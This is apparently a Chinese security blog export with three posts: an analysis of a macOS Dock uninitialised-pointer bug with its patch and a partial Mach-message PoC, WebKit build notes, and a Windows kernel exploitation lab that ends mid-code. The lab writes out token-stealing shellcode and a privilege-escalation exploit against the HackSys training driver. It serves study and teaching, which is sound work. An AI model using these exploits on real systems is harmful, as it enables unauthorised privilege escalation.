<h2 id="vuln-10-13’s-Dock-binary"><a href="#vuln-10-13’s-Dock-binary" class="headerlink" title="vuln(10.13’s Dock binary)"></a>vuln(10.13’s Dock binary)</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v107 = a5;</span><br><span class="line">v5 = a3;</span><br><span class="line">v105 = a2;</span><br><span class="line">v111 = <span class="number">1</span>;</span><br><span class="line">v102 = a4;</span><br><span class="line">v6 = (<span class="keyword">const</span> <span class="keyword">char</span> *)a4;</span><br><span class="line">v98 = a4;</span><br><span class="line">v7 = UnserializeCFType(a3, a4, &amp;v89);</span><br><span class="line">v8 = objc_autorelease(*(_QWORD *)&amp;v89);</span><br><span class="line">v9 = (<span class="keyword">void</span> *)_objc_retain(v8);</span><br><span class="line">v10 = v9;</span><br><span class="line"><span class="keyword">if</span> ( v7 )</span><br><span class="line">&#123;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>  v89未初始化，到这里还造成不了什么问题；</p>
<p>主要是看<code>UnserializeCFType</code>的逻辑，这个函数会call到<code>_AXUnserializeCFType</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__text:000000000000F043</span><br><span class="line">__text:000000000000F043                 public _AXUnserializeCFType</span><br><span class="line">__text:000000000000F043 _AXUnserializeCFType proc near          ; CODE XREF: _UnserializeCFType+16↑j</span><br><span class="line">__text:000000000000F043                                         ; _AXUnserializeWrapper+15↓j ...</span><br><span class="line">__text:000000000000F043</span><br><span class="line">__text:000000000000F043 var_8           &#x3D; qword ptr -8</span><br><span class="line">__text:000000000000F043</span><br><span class="line">__text:000000000000F043                 push    rbp</span><br><span class="line">__text:000000000000F044                 mov     rbp, rsp</span><br><span class="line">__text:000000000000F047                 sub     rsp, 10h</span><br><span class="line">__text:000000000000F04B                 mov     [rbp+var_8], rdx</span><br><span class="line">__text:000000000000F04F                 mov     eax, 0FFFF9D8Fh</span><br><span class="line">__text:000000000000F054                 cmp     rcx, 8</span><br><span class="line">__text:000000000000F058                 jb      short loc_F0B7</span><br><span class="line">__text:000000000000F05A                 mov     qword ptr [r8], 0</span><br><span class="line">__text:000000000000F061                 mov     esi, [rdx]</span><br><span class="line">__text:000000000000F063                 cmp     esi, 6F77656Eh</span><br><span class="line">__text:000000000000F069                 jz      short loc_F073</span><br><span class="line">__text:000000000000F06B                 cmp     esi, 61656C61h</span><br><span class="line">__text:000000000000F071                 jnz     short loc_F0B7</span><br><span class="line">__text:000000000000F073</span><br><span class="line">__text:000000000000F073 loc_F073:                               ; CODE XREF: _AXUnserializeCFType+26↑j</span><br><span class="line">__text:000000000000F073                 lea     rax, [rdx+4]</span><br><span class="line">__text:000000000000F077                 mov     [rbp+var_8], rax</span><br><span class="line">__text:000000000000F07B                 mov     eax, [rdx+4]</span><br><span class="line">__text:000000000000F07E                 cmp     rax, 0Fh</span><br><span class="line">__text:000000000000F082                 jbe     short loc_F08D</span><br><span class="line">__text:000000000000F084                 lea     r9, _bogusUnserialize</span><br><span class="line">__text:000000000000F08B                 jmp     short loc_F098</span><br><span class="line">__text:000000000000F08D ; ---------------------------------------------------------------------------</span><br><span class="line">__text:000000000000F08D</span><br><span class="line">__text:000000000000F08D loc_F08D:                               ; CODE XREF: _AXUnserializeCFType+3F↑j</span><br><span class="line">__text:000000000000F08D                 lea     rdx, _sUnserializeFunctions</span><br><span class="line">__text:000000000000F094                 mov     r9, [rdx+rax*8]</span><br><span class="line">__text:000000000000F098</span><br><span class="line">__text:000000000000F098 loc_F098:                               ; CODE XREF: _AXUnserializeCFType+48↑j</span><br><span class="line">__text:000000000000F098                 add     rcx, 0FFFFFFFFFFFFFFFCh</span><br><span class="line">__text:000000000000F09C                 xor     eax, eax</span><br><span class="line">__text:000000000000F09E                 cmp     esi, 6F77656Eh</span><br><span class="line">__text:000000000000F0A4                 setz    al</span><br><span class="line">__text:000000000000F0A7                 lea     rsi, [rbp+var_8]</span><br><span class="line">__text:000000000000F0AB                 mov     rdx, rcx</span><br><span class="line">__text:000000000000F0AE                 mov     rcx, r8</span><br><span class="line">__text:000000000000F0B1                 mov     r8d, eax</span><br><span class="line">__text:000000000000F0B4                 call    r9 ; _bogusUnserialize</span><br><span class="line">__text:000000000000F0B7</span><br><span class="line">__text:000000000000F0B7 loc_F0B7:                               ; CODE XREF: _AXUnserializeCFType+15↑j</span><br><span class="line">__text:000000000000F0B7                                         ; _AXUnserializeCFType+2E↑j</span><br><span class="line">__text:000000000000F0B7                 add     rsp, 10h</span><br><span class="line">__text:000000000000F0BB                 pop     rbp</span><br><span class="line">__text:000000000000F0BC                 retn</span><br><span class="line">__text:000000000000F0BC _AXUnserializeCFType endp</span><br></pre></td></tr></table></figure>

<p>问题就在于这个函数里对这个未初始化的指针的处理，这个函数也没有初始化这个指针，而是直接判断<code>  cmp     rcx, 8</code>，决定是否执行反序列化的操作；然而，rcx是一个可控值，这里可以控制rcx小于8，然后使<code>UnserializeCFType</code>执行失败。</p>
<p>这里回到这个服务的MIG handler函数:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v7 = UnserializeCFType(a3, a4, &amp;v89);</span><br><span class="line">v8 = objc_autorelease(*(_QWORD *)&amp;v89);</span><br></pre></td></tr></table></figure>

<p>它默认<code>UnserializeCFType</code>执行成功，并不考虑任何失败的情况，这就导致后面直接使用这个未初始化的指针作为<code>objc_autorelease</code>的参数。</p>
<h2 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h2>  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_text:0000000000010ABD</span><br><span class="line">__text:0000000000010ABD                 public _AXUnserializeCFType</span><br><span class="line">__text:0000000000010ABD _AXUnserializeCFType proc near          ; CODE XREF: _UnserializeCFType+16↑j</span><br><span class="line">__text:0000000000010ABD                                         ; _AXUnserializeWrapper+1A↓j ...</span><br><span class="line">__text:0000000000010ABD</span><br><span class="line">__text:0000000000010ABD var_8           &#x3D; qword ptr -8</span><br><span class="line">__text:0000000000010ABD</span><br><span class="line">__text:0000000000010ABD                 push    rbp</span><br><span class="line">__text:0000000000010ABE                 mov     rbp, rsp</span><br><span class="line">__text:0000000000010AC1                 sub     rsp, 10h</span><br><span class="line">__text:0000000000010AC5                 mov     [rbp+var_8], rdx</span><br><span class="line">__text:0000000000010AC9                 mov     qword ptr [r8], 0</span><br><span class="line">__text:0000000000010AD0                 mov     eax, 0FFFF9D8Fh</span><br><span class="line">__text:0000000000010AD5                 cmp     rcx, 8</span><br><span class="line">__text:0000000000010AD9                 jb      short loc_10B31</span><br><span class="line">__text:0000000000010ADB                 mov     esi, [rdx]</span><br><span class="line">__text:0000000000010ADD                 cmp     esi, 6F77656Eh</span><br><span class="line">__text:0000000000010AE3                 jz      short loc_10AED</span><br></pre></td></tr></table></figure>

<p>在 <code>_AXUnserializeCFType</code> 对之前没初始化的指针先set NULL处理，然后再执行<code>cmp rcx 8</code>。 所以即使之前还是有未初始化的情况，在这里也彻底堵死了。</p>
<p>苹果的这个补法还是挺优雅的，代价也比较小，比一个handler一个handler得去做初始化的工作要方便多了 :-) </p>
<h2 id="ref"><a href="#ref" class="headerlink" title="ref"></a>ref</h2><p><a href="https://labs.mwrinfosecurity.com/assets/BlogFiles/apple-safari-pwn2own-vuln-write-up-2018-10-29-final.pdf">apple-safari-pwn2own-vuln-write-up-2018-10-29</a></p>
<h2 id="伪POC"><a href="#伪POC" class="headerlink" title="伪POC"></a><del>伪POC</del></h2><p>我没看这个洞所在的handler，而是看到了另外的类似的情况，已另外一个handler为目标写的poc    : (</p>
<p>有些字段瞎填的，不影响，找个老版本，改一改字段应该ok。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dock_msg</span>&#123;</span></span><br><span class="line">	<span class="keyword">mach_msg_header_t</span> hdr;</span><br><span class="line">	<span class="keyword">mach_msg_body_t</span> body;</span><br><span class="line">	<span class="keyword">mach_msg_ool_descriptor_t</span> ool_desc;</span><br><span class="line">	<span class="keyword">uint32_t</span> PAD[<span class="number">2</span>];</span><br><span class="line">	<span class="keyword">uint32_t</span> ool_size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dock_msg</span> <span class="title">m</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//header +0</span></span><br><span class="line">m.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, <span class="number">0</span>);</span><br><span class="line">m.hdr.msgh_bits |= MACH_MSGH_BITS_COMPLEX; <span class="comment">// must be complex msg</span></span><br><span class="line">m.hdr.msgh_size = <span class="keyword">sizeof</span>(struct dock_msg);</span><br><span class="line">m.hdr.msgh_remote_port = service_port;</span><br><span class="line">m.hdr.msgh_local_port = <span class="number">0</span>;</span><br><span class="line">m.hdr.msgh_voucher_port = <span class="number">0</span>; <span class="comment">//anything you want :-)</span></span><br><span class="line">m.hdr.msgh_id = id;</span><br><span class="line"></span><br><span class="line"><span class="comment">//body must be 1, +0x18</span></span><br><span class="line">m.body.msgh_descriptor_count = <span class="number">1</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> *tmp = <span class="built_in">malloc</span>(<span class="number">0x1337</span>);</span><br><span class="line"><span class="comment">//ool desc 12 bytes, +0x1c</span></span><br><span class="line"></span><br><span class="line">m.ool_desc.address = tmp;</span><br><span class="line">m.ool_desc.deallocate = <span class="number">0</span>;</span><br><span class="line">m.ool_desc.copy = <span class="number">0</span>;</span><br><span class="line">m.ool_desc.pad1 = <span class="number">0</span>;</span><br><span class="line">m.ool_desc.type = <span class="number">1</span>;</span><br><span class="line">m.ool_desc.size = <span class="number">0x1337</span>; <span class="comment">//这个就是 cmp rcx, 8 的rcx</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// padding, +0x28</span></span><br><span class="line">m.PAD[<span class="number">0</span>] = <span class="number">0x1337</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ool size +0x34</span></span><br><span class="line">m.ool_size = <span class="number">0x1337</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>macOS</tag>
      </tags>
  </entry>
  <entry>
    <title>Webkit编译踩坑记录</title>
    <url>/2018/12/31/Webkit%E7%BC%96%E8%AF%91%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h4 id="0x00-环境及工具"><a href="#0x00-环境及工具" class="headerlink" title="0x00 : 环境及工具"></a>0x00 : 环境及工具</h4><p>MacOS MoJave 10.14.2</p>
<p>Xcode 10.1</p>
<a id="more"></a>



<h4 id="0x01-编译过程"><a href="#0x01-编译过程" class="headerlink" title="0x01 : 编译过程"></a>0x01 : 编译过程</h4><ol>
<li>下载源码 </li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://github.com/WebKit/webkit</span><br></pre></td></tr></table></figure>

<p>官网那个太不稳定了，一直挂着代理还容易断，github这个镜像更稳定。</p>
<ol start="2">
<li>编译</li>
</ol>
<p>使用Xcode打开项目，依次打开 <code>File--&gt;Workspace Settings--&gt;</code>，选择<code>Advanced</code>，然后选择<code>Custom</code>，并且在<code>Products</code>和<code>Intermediates</code>中填写<code>WebkitBuild</code>，设置完毕。</p>
<p>其他设置默认就可以了，然后Xcode的菜单栏<code>Procduct--&gt;Build</code>，慢慢等它编译吧，大概不到10分钟的样子就可以编译好。</p>
<p>最后得到:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ls</span><br><span class="line">ANGLE.build             JavaScriptCore.build    PAL.build               TestWebKitAPI.build     WebInspectorUI.build    WebKitTestRunner.build  libwebrtc.build</span><br><span class="line">Debug                   MiniBrowser.build       PrecompiledHeaders      WTF.build               WebKit.build            bmalloc.build</span><br><span class="line">DumpRenderTree.build    MobileMiniBrowser.build Release                 WebCore.build           WebKitLegacy.build      gtest.build</span><br></pre></td></tr></table></figure>



<h4 id="0x02-踩坑-dyld-Symbol-not-found"><a href="#0x02-踩坑-dyld-Symbol-not-found" class="headerlink" title="0x02 : 踩坑(dyld: Symbol not found)"></a>0x02 : 踩坑(dyld: Symbol not found)</h4><p>在运行编译完的binary的时候，我遇到了报错信息:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./Debug/jsc</span><br><span class="line">dyld: Symbol not found: __ZN3JSC10DisallowGC19s_scopeReentryCountE</span><br><span class="line">  Referenced from: /Users/muhe/Code/webkit/WebKitBuild/./Debug/jsc</span><br><span class="line">  Expected <span class="keyword">in</span>: /System/Library/Frameworks/JavaScriptCore.framework/Versions/A/JavaScriptCore</span><br><span class="line"> <span class="keyword">in</span> /Users/muhe/Code/webkit/WebKitBuild/./Debug/jsc</span><br><span class="line">[1]    64039 abort      ./Debug/jsc</span><br></pre></td></tr></table></figure>

<p>搜了很多都无果(可能关键词问题)，问了0x9k师傅之后得到了解决方案，原来官网就有解答 囧</p>
<p>解决方法是：设置<code>DYLD_FRAMEWORK_PATH</code>环境变量。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> DYLD_FRAMEWORK_PATH=/Users/muhe/Code/webkit/WebKitBuild/Debug</span><br></pre></td></tr></table></figure>

<p>之后就可以正常运行了:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./Debug/jsc</span><br><span class="line">&gt;&gt;&gt; var <span class="built_in">test</span> = <span class="string">&quot;Hello jsc&quot;</span>;</span><br><span class="line">undefined</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">test</span></span><br><span class="line">Hello jsc</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>环境配置踩坑</category>
      </categories>
      <tags>
        <tag>Webkit</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows Kernel Exploit Study(1)</title>
    <url>/2017/01/19/Windows-Kernel-Exploit-Study-1/</url>
    <content><![CDATA[<h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00:"></a>0x00:</h4><p>之前在一个小群里joker师傅给大家推荐了一波<a href="http://www.hacking-training.com/download/WKE.pdf">Windows Kernel Exploit</a>，这个入门级的windows kernel pwn的资料，正好跟着学习一下内核相关的知识。</p>
<a id="more"></a>

<h4 id="0x01-环境"><a href="#0x01-环境" class="headerlink" title="0x01: 环境"></a>0x01: 环境</h4><ol>
<li> 所用系统说明</li>
</ol>
<pre><code>物理机 ：windows10
虚拟机 ：xp sp3 cn</code></pre>
<ol start="2">
<li>过程中用到的工具</li>
</ol>
<pre><code>Visual Studio 2010
Windbg
ProcessExplorer
osrloaderv30</code></pre>
<h4 id="0x02-前期准备"><a href="#0x02-前期准备" class="headerlink" title="0x02: 前期准备"></a>0x02: 前期准备</h4><p>首先是双机调试和驱动加载的问题。<br>双机调试的话，首先修改xp的boot.ini文件，该文件在：<code>C:\boot.ini</code>。添加调试相关的选项，为了方便，我直接加了一个启动项，如图：<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/WKE1/bootini_conf.png"><br>然后在vmware里给xp虚拟机加一个串口就可以了，配置如下图：<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/WKE1/vm_pipe.png"><br>然后，进入windbg，选择：File–Kernel Debug，选中COM栏，填写相应的管道的信息，然后就可以开始调试了。<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/WKE1/windbg_pipe.png"></p>
<p>想要断下来然后单步可以直接：Debug———Break，这样就可以断下来了。<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/WKE1/dbg_view.png"><br>之后使用<code>osrloaderv30</code>工具去加载目标驱动。<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/WKE1/sys_loaded.png"></p>
<h4 id="0x03-分析"><a href="#0x03-分析" class="headerlink" title="0x03: 分析"></a>0x03: 分析</h4><p>开始只是准备尝试下最简单的Stackoverflow vuln去提权，关于这部分，驱动的源码如下：<br>这里只贴出来派遣例程部分的代码，漏洞很明显，内核里直接使用了用户层传进来的size进行拷贝工作，而没有做任何的check，导致栈溢出。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">TriggerStackOverflow</span><span class="params">(IN PVOID UserBuffer, IN SIZE_T Size)</span> </span>&#123;</span><br><span class="line">    NTSTATUS Status = STATUS_SUCCESS;</span><br><span class="line">    ULONG KernelBuffer[BUFFER_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    PAGED_CODE();</span><br><span class="line"></span><br><span class="line">    __try &#123;</span><br><span class="line">        <span class="comment">// Verify if the buffer resides in user mode</span></span><br><span class="line">        ProbeForRead(UserBuffer, <span class="keyword">sizeof</span>(KernelBuffer), (ULONG)__alignof(KernelBuffer));</span><br><span class="line"></span><br><span class="line">        DbgPrint(<span class="string">"[+] UserBuffer: 0x%p\n"</span>, UserBuffer);</span><br><span class="line">        DbgPrint(<span class="string">"[+] UserBuffer Size: 0x%X\n"</span>, Size);</span><br><span class="line">        DbgPrint(<span class="string">"[+] KernelBuffer: 0x%p\n"</span>, &amp;KernelBuffer);</span><br><span class="line">        DbgPrint(<span class="string">"[+] KernelBuffer Size: 0x%X\n"</span>, <span class="keyword">sizeof</span>(KernelBuffer));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SECURE</span></span><br><span class="line">        <span class="comment">// Secure Note: This is secure because the developer is passing a size</span></span><br><span class="line">        <span class="comment">// equal to size of KernelBuffer to RtlCopyMemory()/memcpy(). Hence,</span></span><br><span class="line">        <span class="comment">// there will be no overflow</span></span><br><span class="line">        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, <span class="keyword">sizeof</span>(KernelBuffer));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">        DbgPrint(<span class="string">"[+] Triggering Stack Overflow\n"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Vulnerability Note: This is a vanilla Stack based Overflow vulnerability</span></span><br><span class="line">        <span class="comment">// because the developer is passing the user supplied size directly to</span></span><br><span class="line">        <span class="comment">// RtlCopyMemory()/memcpy() without validating if the size is greater or</span></span><br><span class="line">        <span class="comment">// equal to the size of KernelBuffer</span></span><br><span class="line">        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER) &#123;</span><br><span class="line">        Status = GetExceptionCode();</span><br><span class="line">        DbgPrint(<span class="string">"[-] Exception Code: 0x%X\n"</span>, Status);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以写一个demo去触发这个漏洞，然后使用Token替换的思路去提权。<br>根据<a href="http://www.hacking-training.com/download/WKE.pdf">WEK.pdf</a>的例程，demo如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// bof_demo.cpp : Defines the entry point for the console application.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACKSYS_EVD_IOCTL_STACK_OVERFLOW CTL_CODE(FILE_DEVICE_UNKNOWN,0x800,METHOD_NEITHER,FILE_READ_DATA | FILE_WRITE_DATA)</span></span><br><span class="line"><span class="comment">//#define HACKSYS_EVD_IOCTL_STACK_OVERFLOW   CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc,_TCHAR* argv[])&#123;</span><br><span class="line"></span><br><span class="line">    DWORD lpBytesReturned;</span><br><span class="line">    PVOID pMemoryAddress = <span class="literal">NULL</span>;</span><br><span class="line">    PULONG lpInBuffer = <span class="literal">NULL</span>;</span><br><span class="line">    LPCSTR lpDeviceName = (LPCSTR) <span class="string">"\\\\.\\HackSysExtremeVulnerableDriver"</span>;</span><br><span class="line">    SIZE_T nInBufferSize = <span class="number">768</span> * <span class="keyword">sizeof</span>(ULONG);</span><br><span class="line">    <span class="comment">//SIZE_T nInBufferSize = 1024 * sizeof(ULONG);</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]Getting the device handle\r\n"</span>);</span><br><span class="line">    HANDLE hDriver = CreateFileA(lpDeviceName,</span><br><span class="line">        GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">        FILE_SHARE_READ | FILE_SHARE_WRITE,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        OPEN_EXISTING,</span><br><span class="line">        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,</span><br><span class="line">        <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (hDriver == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[*]Failed to get device handle : (0x%X\r\n)"</span>,GetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]Got the device Handle : 0x%X\r\n"</span>, hDriver);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]Allocating Memory For Input Buffer\r\n"</span>);</span><br><span class="line">    lpInBuffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, nInBufferSize);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!lpInBuffer) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[*]HeapAlloc failed :(0x%X\r\n)"</span>,GetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]Input buffer allocated as 0x%X bytes.\r\n"</span>,nInBufferSize);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]Input buffer address : 0x%p\r\n"</span>,lpInBuffer);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]Filling buffer with A's\r\n"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//char *data = "junk for get bof length....";</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//memcpy(lpInBuffer,data,nInBufferSize);</span></span><br><span class="line"></span><br><span class="line">    RtlFillMemory((PVOID)lpInBuffer, nInBufferSize, <span class="number">0x41</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]Send IOCTL request\r\n"</span>);</span><br><span class="line"></span><br><span class="line">    DeviceIoControl(hDriver,</span><br><span class="line">        HACKSYS_EVD_IOCTL_STACK_OVERFLOW,</span><br><span class="line">        (LPVOID)lpInBuffer,</span><br><span class="line">        (DWORD)nInBufferSize,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        &amp;lpBytesReturned,</span><br><span class="line">        <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]IOCTL request completed,cleaning up da heap.\r\n"</span>);</span><br><span class="line">    HeapFree(GetProcessHeap(), <span class="number">0</span>, (LPVOID)lpInBuffer);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这段代码也很简单，自定义的buffer和size，然后传递给目标驱动的Stackoverflow的派遣例程。</p>
<h4 id="0x04-过程"><a href="#0x04-过程" class="headerlink" title="0x04: 过程"></a>0x04: 过程</h4><p>下面就可以开始先去确定bof的长度了，使用kali下的pattern_create和pattern_offset工具，他们的路径在kali2下是：<code>/usr/share/metasploit-framework/tools/exploit</code>。<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/WKE1/p_create.png"><br>修改上述源码部分：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> *data = <span class="string">"result of ./pattern_create.rb -l 3506"</span>;</span><br><span class="line"><span class="built_in">memcpy</span>(lpInBuffer,data,nInBufferSize);</span><br></pre></td></tr></table></figure>
<p>重新编译demo_bof，然后运行。<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/WKE1/crash.png"><br>崩溃了，eip被覆盖成了junk字符，然后确定偏移：<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/WKE1/offset.png"><br>payload应该是：<code>2080 bytes</code> + <code>sc addr</code></p>
<p>经典的TokenStealingShellcode如下：<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/WKE1/tokenstealing.png"></p>
<p>构造出来的exploit如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//#define HACKSYS_EVD_IOCTL_STACK_OVERFLOW CTL_CODE(FILE_DEVICE_UNKNOWN,0x800,\</span></span><br><span class="line">    METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACKSYS_EVD_IOCTL_STACK_OVERFLOW CTL_CODE(FILE_DEVICE_UNKNOWN,0x800,\</span></span><br><span class="line">    METHOD_NEITHER, FILE_ANY_ACCESS)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KTHREAD_OFFSET  0x124</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EPROCESS_OFFSET 0x044</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PID_OFFSET        0x084</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FLINK_OFFSET    0x088</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TOKEN_OFFSET    0x0c8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYSTEM_PID      0x004</span></span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">TokenStealingShellcodeWin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        pushad</span><br><span class="line"></span><br><span class="line">        mov eax, fs:[KTHREAD_OFFSET]</span><br><span class="line">        mov eax, [eax + EPROCESS_OFFSET]</span><br><span class="line"></span><br><span class="line">        mov ecx, eax</span><br><span class="line">        mov ebx, [eax + TOKEN_OFFSET]</span><br><span class="line">        mov edx, SYSTEM_PID</span><br><span class="line"></span><br><span class="line">        SearchSystemPID :</span><br><span class="line">        mov eax, [eax + FLINK_OFFSET]</span><br><span class="line">            sub eax, FLINK_OFFSET</span><br><span class="line">            cmp[eax + PID_OFFSET], edx</span><br><span class="line">            jne SearchSystemPID</span><br><span class="line"></span><br><span class="line">            mov edx, [eax + TOKEN_OFFSET]</span><br><span class="line">            mov[ecx + TOKEN_OFFSET], edx</span><br><span class="line"></span><br><span class="line">            popad</span><br><span class="line"></span><br><span class="line">            ; recovery</span><br><span class="line">            <span class="keyword">xor</span> eax, eax; <span class="built_in">set</span> NTSTATUS SUCEESS</span><br><span class="line">            add esp, <span class="number">12</span>; fix <span class="built_in">stack</span></span><br><span class="line">            pop ebp</span><br><span class="line">            ret <span class="number">8</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[]) &#123;</span><br><span class="line"></span><br><span class="line">    DWORD lpBytesReturned;</span><br><span class="line">    PVOID pMemoryAddress = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">//PULONG lpInBuffer = NULL;</span></span><br><span class="line">    LPCSTR lpDeviceName = (LPCSTR) <span class="string">"\\\\.\\HackSysExtremeVulnerableDriver"</span>;</span><br><span class="line">    <span class="comment">//SIZE_T nInBufferSize = 1024 * sizeof(ULONG);</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Getting the device handle\r\n"</span>);</span><br><span class="line">    HANDLE hDriver = CreateFileA(lpDeviceName,</span><br><span class="line">        GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">        FILE_SHARE_READ | 